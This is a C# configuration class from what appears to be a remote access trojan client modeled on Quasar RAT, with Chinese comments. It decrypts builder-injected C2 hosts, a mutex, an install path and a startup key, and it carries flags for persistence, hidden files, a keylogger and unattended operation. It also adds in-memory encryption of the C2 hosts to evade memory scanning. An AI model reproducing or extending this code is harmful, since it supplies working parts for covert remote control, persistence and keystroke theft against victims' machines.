﻿using 财源广进.Common.Cryptography;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;

namespace 财源广进.Client.Config
{
    public static class Settings
    {
        // 原始加密数据（由生成器注入）
        public static string VERSION = "";
        public static string HOSTS = "";
        public static string SUBDIRECTORY = "";
        public static string INSTALLNAME = "";
        public static string MUTEX = "";
        public static string STARTUPKEY = "";
        public static string ENCRYPTIONKEY = "";
        public static string TAG = "";
        public static string LOGDIRECTORYNAME = "";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";

        // 内存加密后的字节数组
        private static byte[] _mTag;
        private static byte[] _mHosts;
        private static byte[] _mMutex;
        private static byte[] _mInstallName;
        private static byte[] _mSubDir;

        // 属性访问器（动态解密）
        public static string M_TAG => MemoryProtection.Unprotect(_mTag);
        public static string M_HOSTS => MemoryProtection.Unprotect(_mHosts);
        public static string M_MUTEX => MemoryProtection.Unprotect(_mMutex);
        public static string M_INSTALLNAME => MemoryProtection.Unprotect(_mInstallName);
        public static string M_SUBDIRECTORY => MemoryProtection.Unprotect(_mSubDir);

        public static int RECONNECTDELAY = 5000;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = false;
        public static X509Certificate2 SERVERCERTIFICATE;
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool UNATTENDEDMODE = false;

        public static bool Initialize()
        {
            if (string.IsNullOrEmpty(VERSION)) return false;
            try
            {
                var aes = new Aes256(ENCRYPTIONKEY);
                
                // 解密并立即存入受保护内存
                _mTag = MemoryProtection.Protect(aes.Decrypt(TAG));
                _mHosts = MemoryProtection.Protect(aes.Decrypt(HOSTS));
                _mMutex = MemoryProtection.Protect(aes.Decrypt(MUTEX));
                _mInstallName = MemoryProtection.Protect(aes.Decrypt(INSTALLNAME));
                _mSubDir = MemoryProtection.Protect(aes.Decrypt(SUBDIRECTORY));

                // 其他非核心配置保持原样或处理
                VERSION = aes.Decrypt(VERSION);
                STARTUPKEY = aes.Decrypt(STARTUPKEY);
                LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
                SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
                SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
                
                SetupPaths();
                return VerifyHash();
            }
            catch { return false; }
        }

        static void SetupPaths()
        {
            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
            string sub = M_SUBDIRECTORY;
            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(sub) ? sub + @"\" : "") + M_INSTALLNAME);
        }

        static bool VerifyHash()
        {
            try
            {
                var csp = (RSACryptoServiceProvider)SERVERCERTIFICATE.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), CryptoConfig.MapNameToOID("SHA256"),
                    Convert.FromBase64String(SERVERSIGNATURE));
            }
            catch { return false; }
        }
    }
}
